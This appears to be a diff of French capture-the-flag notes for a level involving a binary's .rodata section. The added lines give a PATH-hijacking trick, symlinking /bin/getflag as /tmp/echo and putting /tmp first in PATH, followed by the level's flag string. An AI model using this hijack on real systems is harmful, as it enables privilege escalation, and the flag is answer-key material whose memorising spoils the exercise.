@@ -12,4 +12,7 @@ Contents of section .rodata:
 
 update du path dans l'env
 
+ln -s /bin/getflag /tmp/echo
+export PATH=/tmp:$PATH
+
 flag :qi0maab88jeaj46qoumi7maus
